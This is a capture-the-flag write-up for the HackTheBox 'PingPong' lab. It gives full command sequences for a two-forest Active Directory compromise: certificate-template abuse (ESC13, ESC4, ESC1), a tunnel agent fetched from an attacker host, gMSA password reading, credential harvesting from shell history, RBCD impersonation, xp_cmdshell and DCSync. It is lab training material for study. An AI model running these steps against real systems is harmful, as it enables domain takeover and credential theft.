---
title: "HTB - PingPong"
date: 2026-04-19
tags: ["HackTheBox","Windows","Insane","ActiveDirectory","ADCS","ESC13","PKINIT","Kerberos"]
categories: ["Machines&Challenges"]
difficulty: "Insane"
os: "Windows"
author: "z3r0s"
featuredImage: "/logos/PingPong.png"
---
**Difficulty:** Insane  
**OS:** Windows  
**Points:** 50  
**Release:** 2026-04-27  
**Starting Creds:** `c.roberts / AssumedBreach123`

---

## Attack Chain

```
c.roberts (PING.HTB)
  → ESC13 (TemporaryWinRM) → PKINIT TGT + TempWinRMAccess SID → WinRM on DC1
  → Ligolo-ng tunnel → DC2 reachable (192.168.2.2)
  → WriteDACL on gMSA Managers (PONG) → GenericAll → scope flip (Global→Universal→DomainLocal)
  → Add cross-forest FSP → ReadGMSAPassword → Pong_gMSA$ NTLM/AES
  → JEA endpoint on DC1 (restricted) → PSReadLine history → c.carlssen / A()DUJ!@414
  → WinRM on DC2 → user.txt
  → c.carlssen GenericWrite on svc_sql → RBCD (Pong_gMSA$ → svc_sql)
  → S4U2Proxy impersonate c.adam → MSSQL xp_cmdshell → local admin on DC2
  → c.carlssen → Domain Admins (PONG) → DCSync → R.Martinelli
  → R.Martinelli ∈ CA Managers (PING) → ESC4 on SmartcardAuthentication → ESC1
  → cert for Administrator@ping.htb → PKINIT → root.txt on DC1
```

---

## Recon

Classic Windows DC port profile: `53, 88, 135, 389, 445, 464, 636, 3268, 3269, 5985, 9389`

NTLM is disabled - every NTLM bind returns `STATUS_NOT_SUPPORTED`. All authentication must use Kerberos.

BloodHound confirms a **bidirectional forest trust**: `PING.HTB ↔ PONG.HTB`. DC2 at `192.168.2.2` is only reachable from inside DC1's network.

---

## Step 0: Clock Sync (Critical)

The DC clock runs ~8 hours ahead. Kerberos requires < 5 minute skew.

```bash
sudo ntpdate -u dc1.ping.htb
```

After syncing, **drop faketime entirely** - your system clock is now the DC clock. Using faketime after sync adds another 8 hours and breaks everything.

---

## Step 1: Initial TGT + BloodHound

```bash
impacket-getTGT ping.htb/c.roberts:'AssumedBreach123' -dc-ip <DC_IP>
export KRB5CCNAME=$PWD/c.roberts.ccache
```

```bash
bloodhound-python \
    -d ping.htb \
    -u c.roberts \
    -p 'AssumedBreach123' \
    -dc dc1.ping.htb \
    -ns <DC_IP> \
    -c All \
    --zip \
    --output bloodhound/ \
    --auth-method kerberos
```

Key BloodHound findings:
- Bidirectional forest trust PING ↔ PONG
- `IT` group (c.roberts is member) has **WriteDACL** on `gMSA Managers` in PONG
- `gMSA Managers` has **ReadGMSAPassword** on `Pong_gMSA$`
- `Pong_gMSA$` has access to JEA endpoint `restricted` on DC1

---

## Step 2: ADCS Enumeration - Find ESC13

```bash
certipy-ad find \
    -u c.roberts@ping.htb \
    -k -no-pass \
    -dc-ip <DC_IP> \
    -vulnerable
```

Finds `TemporaryWinRM` template flagged as **ESC13**. An issuance policy on the template is linked to the `TempWinRMAccess` AD group. The group has no direct members - but any certificate issued from this template will embed the group's SID into the Kerberos PAC at PKINIT time, effectively granting group membership at authentication.

---

## Step 3: Foothold - ESC13 → WinRM on DC1

### Request Certificate

```bash
certipy-ad req \
    -u 'c.roberts@ping.htb' \
    -k -no-pass \
    -ca 'PING-DC1-CA' \
    -target dc1.ping.htb \
    -template 'TemporaryWinRM' \
    -dc-ip <DC_IP> \
    -dc-host dc1.ping.htb
```

### Authenticate via PKINIT

```bash
certipy-ad auth \
    -pfx c.roberts.pfx \
    -username c.roberts \
    -domain ping.htb \
    -dc-ip <DC_IP>

export KRB5CCNAME=$PWD/c.roberts.ccache
```

The resulting TGT now contains the `TempWinRMAccess` SID in the PAC. The DC sees c.roberts as a member of `TempWinRMAccess`, which has WinRM access via the session configuration.

### WinRM Shell

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB
```

Shell as `ping\c.roberts`.

> **Note:** `evil-winrm` must use Kerberos (`-r` flag), not password. The cert-derived TGT is what carries the `TempWinRMAccess` SID - a plain password TGT doesn't have it.

---

## Step 4: Pivot to DC2 - Ligolo-ng Tunnel

DC2 (`192.168.2.2`) is only reachable from DC1. Set up a tunnel.

### Attack Box

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -laddr 0.0.0.0:11601 -selfcert
```

### DC1 (evil-winrm shell)

```powershell
certutil -urlcache -split -f http://<ATTACKER_IP>:8080/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Ligolo Console

```
ligolo-ng » session
[Agent : PING\C.Roberts@dc1] » start
```

### Route DC2 subnet

```bash
sudo ip route add 192.168.2.0/24 dev ligolo
ping -c 2 192.168.2.2   # verify
```

### /etc/hosts

```
<DC_IP>      dc1.ping.htb ping.htb
192.168.2.2  dc2.pong.htb pong.htb
```

### krb5.conf

```ini
[libdefaults]
    default_realm = PING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PING.HTB = {
        kdc = <DC_IP>
        admin_server = <DC_IP>
    }
    PONG.HTB = {
        kdc = 192.168.2.2
        admin_server = 192.168.2.2
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
```

> **Why Ligolo over proxychains/chisel SOCKS:** Kerberos tickets carry hostnames, not IPs. proxychains breaks in subtle ways with Kerberos tooling. Ligolo routes natively - every tool works without wrappers.

---

## Step 5: Cross-Forest gMSA Abuse

### Get Cross-Realm Ticket

bloodyAD uses its own Kerberos stack (minikerberos) and needs a cross-realm ticket in the ccache before it will authenticate to DC2.

```bash
kvno ldap/dc2.pong.htb@PONG.HTB
klist  # should now show krbtgt/PONG.HTB@PING.HTB and ldap/dc2.pong.htb@PONG.HTB
```

### Grant GenericAll on gMSA Managers

c.roberts has WriteDACL on `gMSA Managers` - use it to grant ourselves GenericAll:

```bash
bloodyAD \
    -k "ccache=$PWD/c.roberts.ccache" \
    --host dc2.pong.htb \
    --dc-ip 192.168.2.2 \
    -d pong.htb \
    -u 'c.roberts@PING.HTB' \
    add genericAll \
    'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
    'S-1-5-21-750635624-2058721901-1932338391-2617'
```

### Flip Group Scope: Global → Universal → Domain Local

AD **forbids** adding cross-forest principals to Global groups - the modify silently fails with `WILL_NOT_PERFORM`. Must go Global → Universal first, then Universal → Domain Local.

```bash
# Global → Universal (-2147483646)
bloodyAD \
    -k "ccache=$PWD/c.roberts.ccache" \
    --host dc2.pong.htb --dc-ip 192.168.2.2 \
    -d pong.htb -u 'c.roberts@PING.HTB' \
    set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType \
    -v -2147483646

# Universal → Domain Local (-2147483644)
bloodyAD \
    -k "ccache=$PWD/c.roberts.ccache" \
    --host dc2.pong.htb --dc-ip 192.168.2.2 \
    -d pong.htb -u 'c.roberts@PING.HTB' \
    set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType \
    -v -2147483644
```

### Create ForeignSecurityPrincipal + Add as Member

```bash
ldapadd -H ldap://192.168.2.2 -Y GSSAPI << 'EOF'
dn: CN=S-1-5-21-750635624-2058721901-1932338391-2617,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
objectClass: foreignSecurityPrincipal
cn: S-1-5-21-750635624-2058721901-1932338391-2617
EOF

ldapmodify -H ldap://192.168.2.2 -Y GSSAPI << 'EOF'
dn: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
changetype: modify
add: member
member: CN=S-1-5-21-750635624-2058721901-1932338391-2617,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
EOF
```

### Read Pong_gMSA$ Password

```bash
nxc ldap dc2.pong.htb \
    -d ping.htb \
    -u c.roberts \
    -k --use-kcache \
    --gmsa
```

```
Account: Pong_gMSA$   NTLM: 4b85a2a049588810c1267e4018b07a07
PrincipalsAllowedToReadPassword: gMSA Managers
```

---

## Step 6: JEA Endpoint → c.carlssen Credentials

`Pong_gMSA$` has access to a JEA (Just Enough Administration) endpoint called `restricted` on DC1. JEA constrains available commands but **does not block filesystem access** - `Get-Content` still works.

### Get TGT for Pong_gMSA$

```bash
impacket-getTGT \
    -hashes :4b85a2a049588810c1267e4018b07a07 \
    pong.htb/'Pong_gMSA$' \
    -dc-ip 192.168.2.2

export KRB5CCNAME=$PWD/'Pong_gMSA$'.ccache
```

### Connect to JEA Endpoint + Read History

```python
python3 -c "
import os
os.environ['KRB5CCNAME'] = 'Pong_gMSA\$.ccache'
from pypsrp.client import Client
c = Client('dc1.ping.htb', auth='kerberos', ssl=False,
    cert_validation=False, configuration_name='restricted')
out, _, _ = c.execute_ps(
    r'Get-Content C:\Users\Pong_gMSA\$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
)
print(out)
"
```

PSReadLine history contains:

```powershell
$c = New-object System.management.automation.pscredential("pong\c.carlssen,
    $(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
```

**Credentials: `c.carlssen / A()DUJ!@414`**

---

## Step 7: User Flag

```bash
kinit -c $PWD/ccarlssen.ccache C.Carlssen@PONG.HTB
# enter password: A()DUJ!@414
export KRB5CCNAME=$PWD/ccarlssen.ccache

evil-winrm -i dc2.pong.htb -r PONG.HTB
```

```powershell
type C:\Users\C.Carlssen\Desktop\user.txt
```

---

## Step 8: RBCD → MSSQL → Local Admin on DC2

c.carlssen has **GenericWrite** on `svc_sql` (SPN: `mssqlsvc/dc2.pong.htb`). `MachineAccountQuota = 0` so the standard fake-computer RBCD is blocked. Use `Pong_gMSA$` (already controlled) as the resource account.

### Configure RBCD

```bash
bloodyAD \
    -k -d pong.htb \
    -u C.Carlssen \
    -p 'A()DUJ!@414' \
    --host dc2.pong.htb \
    add rbcd svc_sql 'Pong_gMSA$'
```

### S4U2Proxy - Impersonate c.adam (MSSQL sysadmin)

```bash
impacket-getST \
    -spn 'mssqlsvc/dc2.pong.htb' \
    -impersonate 'c.adam' \
    -aesKey <PONG_GMSA_AES256> \
    -dc-ip 192.168.2.2 \
    'pong.htb/Pong_gMSA$'

export KRB5CCNAME='c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache'
```

### MSSQL → xp_cmdshell

```bash
impacket-mssqlclient \
    -k -no-pass \
    -target-ip 192.168.2.2 \
    'PONG.HTB/c.adam@dc2.pong.htb'
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'net localgroup administrators c.carlssen /add';
```

---

## Step 9: Domain Admin (PONG) + DCSync

```bash
# Add c.carlssen to Domain Admins
bloodyAD \
    -k -d pong.htb \
    -u C.Carlssen \
    -p 'A()DUJ!@414' \
    --host dc2.pong.htb \
    add groupMember \
    'CN=Domain Admins,CN=Users,DC=pong,DC=htb' \
    'C.Carlssen'

# DCSync PONG
impacket-secretsdump \
    -k -no-pass \
    -dc-ip 192.168.2.2 \
    'PONG.HTB/C.Carlssen@dc2.pong.htb'
```

Note `R.Martinelli` hash - she is in **CA Managers** in PING.HTB.

```bash
# Reset R.Martinelli password for easy access
bloodyAD \
    -k -d pong.htb \
    -u C.Carlssen \
    -p 'A()DUJ!@414' \
    --host dc2.pong.htb \
    set password 'R.Martinelli' 'PingPong1!'
```

---

## Step 10: ESC4 → ESC1 → Administrator@PING.HTB → root.txt

R.Martinelli is in **CA Managers** in PING.HTB - this grants WriteDACL on certificate templates (ESC4). Use it to enable ESC1 on `SmartcardAuthentication`, then request a cert as Administrator.

### Get R.Martinelli TGT

```bash
impacket-getTGT ping.htb/R.Martinelli:'PingPong1!' -dc-ip <DC_IP>
export KRB5CCNAME=$PWD/R.Martinelli.ccache
```

### ESC4: Enable Enrollee-Supplied SAN

```bash
ldapmodify -H ldap://dc1.ping.htb -Y GSSAPI << 'EOF'
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 1
EOF
```

### Grant c.roberts Enrollment Rights

```bash
bloodyAD \
    -k --host dc1.ping.htb \
    -d ping.htb \
    -u 'R.Martinelli@PONG.HTB' \
    add genericAll \
    'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    'S-1-5-21-750635624-2058721901-1932338391-2617'
```

### ESC1: Request Cert as Administrator

```bash
export KRB5CCNAME=$PWD/c.roberts.ccache

certipy-ad req \
    -k -no-pass \
    -u c.roberts@ping.htb \
    -target dc1.ping.htb \
    -template SmartcardAuthentication \
    -ca PING-DC1-CA \
    -upn Administrator@ping.htb \
    -sid 'S-1-5-21-750635624-2058721901-1932338391-500'
```

### PKINIT → Administrator TGT

```bash
certipy-ad auth \
    -pfx administrator.pfx \
    -username Administrator \
    -domain ping.htb \
    -dc-ip <DC_IP>

export KRB5CCNAME=$PWD/administrator.ccache
```

### Shell + Root Flag

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

**ESC13 is invisible to member enumeration.** `TempWinRMAccess` has no listed members in BloodHound or AD queries. The privilege is injected into the PAC at PKINIT time via the issuance policy link. Trace it from the certificate template side, not the group.

**Global groups silently reject cross-forest member adds.** The LDAP modify returns no error but `WILL_NOT_PERFORM` at the server. You must flip Global → Universal → Domain Local before adding a ForeignSecurityPrincipal. Skipping the Universal step causes the same error even after scope change.

**bloodyAD needs cross-realm tickets pre-fetched.** Its internal Kerberos stack (minikerberos) doesn't automatically fetch cross-realm referrals on demand. Run `kvno ldap/dc2.pong.htb@PONG.HTB` first to populate the ccache, then bloodyAD will work.

**JEA constrained endpoints don't protect the filesystem.** `Get-Content` works inside a restricted session. PSReadLine history at `C:\Users\<account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` is plaintext and worth checking any time you land in a service account context.

**MachineAccountQuota=0 doesn't block gMSA-based RBCD.** The fake-computer trick is dead, but if you already control a gMSA it's a valid resource account for S4U2Proxy. No new computer object needed.

**Ligolo-ng beats proxychains for Kerberos tooling.** Kerberos tickets carry hostnames. proxychains breaks in subtle ways. Ligolo routes traffic natively - impacket, certipy, bloodyAD all work without wrappers.

**ESC4→ESC1 is a two-forest operation - track KRB5CCNAME carefully.** CA Manager rights come from PONG (R.Martinelli). Template modification targets PING LDAP. Certificate enrollment switches back to c.roberts in PING. Each step needs the correct ccache and dc-ip. Mixing them produces misleading LDAP errors that look like permission failures.

**Clock sync is the foundation of everything.** Sync once with `ntpdate` before starting and drop `faketime` completely. Mixing faketime with a synced clock adds double offset and breaks all Kerberos operations.

---
